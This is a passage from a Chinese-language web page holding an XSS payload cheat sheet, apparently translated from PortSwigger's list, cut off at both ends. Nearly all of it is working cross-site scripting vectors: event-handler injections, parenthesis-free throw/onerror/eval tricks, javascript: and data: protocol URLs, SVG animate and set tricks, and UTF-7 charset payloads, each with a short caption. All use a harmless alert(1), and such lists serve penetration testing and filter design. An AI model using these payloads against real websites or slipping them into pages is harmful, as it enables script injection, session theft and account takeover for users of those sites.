class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondragleave</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre><p>触发拖动元素（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>drag me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">ondragover</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">contenteditable</span>&gt;</span>drop here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要鼠标拖动（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">ondragstart</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;test&lt;/a&gt;</code></pre><p>触发删除可拖动元素（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">draggable</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>drag me<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">ondrop</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">contenteditable</span>&gt;</span>drop here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要作为价值的变化（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">oninput</span>=alert(1) <span class="hljs-attribute">value</span>=xss&gt;</code></pre><p>需要具有不满足其约束的元素（例如必填属性）的表单提交。（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">oninvalid</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">required</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span>&gt;</span></code></pre><p>按下键时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onkeydown</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>按下键时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onkeypress</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>释放按键时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onkeyup</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>按下鼠标时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmousedown</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>当鼠标悬停在元素上时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseenter</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseleave</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要鼠标移动（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmousemove</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseout</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要将鼠标悬停在元素上（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>释放鼠标按钮时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseup</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要粘贴一段文字（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onpaste</span>=<span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-attr">contenteditable</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>需要点击元素才能暂停（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio autoplay controls <span class="hljs-attribute">onpause</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>需要点击（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onreset</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">reset</span>&gt;</span></code></pre><p>提交表单并且输入具有搜索的type属性时触发（Chrome）</p><pre><code class="hljs routeros">&lt;form&gt;&lt;input <span class="hljs-attribute">type</span>=search <span class="hljs-attribute">onsearch</span>=alert(1) <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;Hit return&quot;</span> autofocus&gt;</code></pre><p>需要点击元素时间轴（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio autoplay controls <span class="hljs-attribute">onseeked</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>需要点击元素时间轴（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio autoplay controls <span class="hljs-attribute">onseeking</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>需要选择文字（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">onselect</span>=alert(1) <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;XSS&quot;</span> autofocus&gt;</code></pre><p>需要提交表单（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span>&gt;</span></code></pre><p>需要在页面上的任意位置单击并重新加载（Chrome)</p><pre><code class="hljs pgsql">&lt;svg onunload=<span class="hljs-keyword">window</span>.<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>)&gt;</code></pre><p>需要调节音量（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs routeros">&lt;audio autoplay controls <span class="hljs-attribute">onvolumechange</span>=alert(1)&gt;&lt;source <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;validaudio.wav&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;audio/wav&quot;</span>&gt;&lt;/audio&gt;</code></pre><p>使用鼠标滚轮时触发（Chrome、Firefox、IE、Safari)</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onwheel</span>=<span class="hljs-string">alert(1)</span>&gt;</span></code></pre><h3 id="限制字符"><a href="#限制字符" class="headerlink" title="限制字符"></a>限制字符</h3><p>无括号，使用异常处理</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>无括号，无分号，使用异常处理</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><span class="hljs-template-variable">&#123;onerror=alert&#125;</span><span class="xml"><span class="javascript"><span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre><p>无括号的异常处理，没有使用表达式的半冒号</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">throw</span> onerror=alert,<span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>无括号异常处理和evil</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">throw</span> onerror=<span class="hljs-built_in">eval</span>,<span class="hljs-string">&#x27;=alert\x281\x29&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>无括号，在Firefox上使用异常处理和evil</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="hljs-built_in">eval</span>&#125;<span class="hljs-keyword">throw</span>&#123;<span class="hljs-attr">lineNumber</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">columnNumber</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">fileName</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">message</span>:<span class="hljs-string">&#x27;alert\x281\x29&#x27;</span>&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>无括号，使用ES6 hasInstance和instanceof与eval</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-string">&#x27;alert\x281\x29&#x27;</span><span class="hljs-keyword">instanceof</span>&#123;[<span class="hljs-built_in">Symbol</span>.hasInstance]:<span class="hljs-built_in">eval</span>&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>无括号，使用ES6的hasInstance和instanceof以及eval</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-string">&#x27;alert\x281\x29&#x27;</span><span class="hljs-keyword">instanceof</span>&#123;[<span class="hljs-built_in">Symbol</span>[<span class="hljs-string">&#x27;hasInstance&#x27;</span>]]:<span class="hljs-built_in">eval</span>&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>无括号，使用位置重定向</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location=<span class="hljs-string">&#x27;javascript:alert\x281\x29&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>无字符串，使用位置没有括号重定向</p><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">script</span>&gt;location=<span class="hljs-built_in">name</span>&lt;/<span class="hljs-keyword">script</span>&gt;</code></pre><p>无括号，使用模板字符串</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><h3 id="前端框架"><a href="#前端框架" class="headerlink" title="前端框架"></a>前端框架</h3><p>Bootstrap onanimationstart事件</p><pre><code class="hljs routeros">&lt;xss <span class="hljs-attribute">class</span>=progress-bar-animated <span class="hljs-attribute">onanimationstart</span>=alert(1)&gt;</code></pre><p>Bootstrap ontransitionend事件</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xss</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;carousel slide&quot;</span> <span class="hljs-attr">data-ride</span>=<span class="hljs-string">carousel</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">100</span> <span class="hljs-attr">ontransitionend</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xss</span> <span class="hljs-attr">class</span>=<span class="hljs-string">carousel-inner</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xss</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;carousel-item active&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xss</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xss</span> <span class="hljs-attr">class</span>=<span class="hljs-string">carousel-item</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xss</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xss</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xss</span>&gt;</span></code></pre><h3 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h3><p>iframe src属性JavaScript协议</p><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</code></pre><p>具有JavaScript协议的对象data属性</p><pre><code class="hljs haskell">&lt;object <span class="hljs-class"><span class="hljs-keyword">data</span>=&quot;javascript:alert(1)&quot;&gt;</span></code></pre><p>使用JavaScript协议嵌入src属性</p><pre><code class="hljs routeros">&lt;embed <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</code></pre><p>标准的JavaScript协议</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>不区分大小写的协议</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;JaVaScript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>协议之前允许使用字符\x01- \x20</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;     javascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>协议中允许使用字符\ x09，\x0a，\x0d</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javas    cript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>协议名称后在冒号前允许字符\x09，\x0a，\x0d</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javas  cript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>带有JavaScript协议的SVG中的Xlink命名空间</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>使用值的SVG动画标签</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animate</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">#xss</span> <span class="hljs-attr">attributeName</span>=<span class="hljs-string">href</span> <span class="hljs-attr">values</span>=<span class="hljs-string">javascript:alert(1)</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">xss</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">20</span> <span class="hljs-attr">y</span>=<span class="hljs-string">20</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>SVG动画标签用于</p><pre><code class="hljs routeros">&lt;svg&gt;&lt;animate xlink:<span class="hljs-attribute">href</span>=#xss <span class="hljs-attribute">attributeName</span>=href <span class="hljs-attribute">from</span>=javascript:alert(1) <span class="hljs-attribute">to</span>=1 /&gt;&lt;a <span class="hljs-attribute">id</span>=xss&gt;&lt;text <span class="hljs-attribute">x</span>=20 <span class="hljs-attribute">y</span>=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre><p>SVG设置标签</p><pre><code class="hljs routeros">&lt;svg&gt;&lt;<span class="hljs-builtin-name">set</span> xlink:<span class="hljs-attribute">href</span>=#xss <span class="hljs-attribute">attributeName</span>=href <span class="hljs-attribute">from</span>=? <span class="hljs-attribute">to</span>=javascript:alert(1) /&gt;&lt;a <span class="hljs-attribute">id</span>=xss&gt;&lt;text <span class="hljs-attribute">x</span>=20 <span class="hljs-attribute">y</span>=20&gt;XSS&lt;/text&gt;&lt;/a&gt;</code></pre><p>脚本src中的数据协议</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/javascript,alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>SVG脚本href属性，无需关闭脚本标签</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;data:text/javascript,alert(1)&quot;</span> /&gt;</span></code></pre><p>SVG使用元素Chrome/Firefox</p><pre><code class="hljs nix">&lt;svg&gt;&lt;use <span class="hljs-attr">href=&quot;data:image/svg+xml,&lt;svg</span> <span class="hljs-attr">id=&#x27;x&#x27;</span> <span class="hljs-attr">xmlns=&#x27;http://www.w3.org/2000/svg&#x27;</span> xmlns:<span class="hljs-attr">xlink=&#x27;http://www.w3.org/1999/xlink&#x27;</span> <span class="hljs-attr">width=&#x27;100&#x27;</span> <span class="hljs-attr">height=&#x27;100&#x27;&gt;&lt;a</span> xlink:<span class="hljs-attr">href=&#x27;javascript:alert(1)&#x27;&gt;&lt;rect</span> <span class="hljs-attr">x=&#x27;0&#x27;</span> <span class="hljs-attr">y=&#x27;0&#x27;</span> <span class="hljs-attr">width=&#x27;100&#x27;</span> <span class="hljs-attr">height=&#x27;100&#x27;</span> /&gt;&lt;/a&gt;&lt;/svg&gt;<span class="hljs-comment">#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span></code></pre><p>带有数据URL的导入语句</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;data:text/javascript,alert(1)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>具有JavaScript协议的基本标记重写了相对URL</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:/a/-alert(1)///////&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">../lol/safari.html</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre><p>MathML使任何标签都可点击</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">math</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">x</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>blah</code></pre><p>按钮和动作</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>XSS</code></pre><p>输入和形式</p><pre><code class="hljs routeros">&lt;form&gt;&lt;input <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">formaction</span>=javascript:alert(1) <span class="hljs-attribute">value</span>=XSS&gt;</code></pre><p>形式与行动</p><pre><code class="hljs routeros">&lt;form <span class="hljs-attribute">action</span>=javascript:alert(1)&gt;&lt;input <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">value</span>=XSS&gt;</code></pre><p>Isindex和formaction</p><pre><code class="hljs routeros">&lt;isindex <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">formaction</span>=javascript:alert(1)&gt;</code></pre><p>index和action</p><pre><code class="hljs routeros">&lt;isindex <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">action</span>=javascript:alert(1)&gt;</code></pre><p>将元素与外部网址一起使用</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//subdomain1.portswigger-labs.net/use_element/upload.php#x&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre><h3 id="其他有用的属性"><a href="#其他有用的属性" class="headerlink" title="其他有用的属性"></a>其他有用的属性</h3><p>使用srcdoc属性</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre><p>对实体使用srcdoc</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="hljs-symbol">&amp;gt;</span>&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre><p>在页面上的任何位置（甚至在表单外部）单击提交元素</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">x</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></code></pre><p>隐藏的输入：访问键属性可以在通常无法利用的元素上启用XSS</p><pre><code class="hljs elm">&lt;input <span class="hljs-keyword">type</span>=&quot;hidden&quot; accesskey=&quot;<span class="hljs-type">X</span>&quot; onclick=&quot;alert(1)&quot;&gt; (<span class="hljs-type">Press</span> <span class="hljs-type">ALT</span>+<span class="hljs-type">SHIFT</span>+<span class="hljs-type">X</span> on <span class="hljs-type">Windows</span>) (<span class="hljs-type">CTRL</span>+<span class="hljs-type">ALT</span>+<span class="hljs-type">X</span> on <span class="hljs-type">OS</span> <span class="hljs-type">X</span>)</code></pre><p>链接元素：访问键属性可以在通常无法利用的元素上启用XSS</p><pre><code class="hljs sas">&lt;<span class="hljs-meta">link</span> rel=<span class="hljs-string">&quot;canonical&quot;</span> accesskey=<span class="hljs-string">&quot;X&quot;</span> onclick=<span class="hljs-string">&quot;alert(1)&quot;</span> /&gt; (Press ALT+SHIFT+<span class="hljs-meta">X</span> <span class="hljs-meta">on</span> Windows) (CTRL+ALT+<span class="hljs-meta">X</span> <span class="hljs-meta">on</span> OS <span class="hljs-meta">X</span>)</code></pre><p>下载属性可以保存当前网页的副本</p><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=# <span class="hljs-attribute">download</span>=<span class="hljs-string">&quot;filename.html&quot;</span>&gt;Test&lt;/a&gt;</code></pre><p>使用Referrerpolicy禁用引荐来源网址</p><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">referrerpolicy</span>=<span class="hljs-string">&quot;no-referrer&quot;</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//portswigger-labs.net&quot;</span>&gt;</code></pre><h3 id="特殊标签"><a href="#特殊标签" class="headerlink" title="特殊标签"></a>特殊标签</h3><p>重定向到其他域</p><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0; url=//portswigger-labs.net&quot;</span>&gt;</code></pre><p>元字符集属性UTF-7</p><pre><code class="hljs applescript">&lt;meta charset=<span class="hljs-string">&quot;UTF-7&quot;</span> /&gt; +ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre><p>元字符集UTF-7</p><pre><code class="hljs applescript">&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-7&quot;</span> /&gt; +ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）1</p><pre><code class="hljs applescript">+/v8+ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）2</p><pre><code class="hljs applescript">+/v9+ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）3</p><pre><code class="hljs applescript">+/v++ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre><p>UTF-7 BOM字符（必须在文档开头）4</p><pre><code class="hljs applescript">+/v/+ADw-<span class="hljs-keyword">script</span>+AD4-alert(<span class="hljs-number">1</span>)+ADw-/<span class="hljs-keyword">script</span>+AD4-</code></pre><p>升级不安全的请求</p><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;upgrade-insecure-requests&quot;</span>&gt;</code></pre><p>通过iframe沙箱禁用JavaScript</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">sandbox</span> 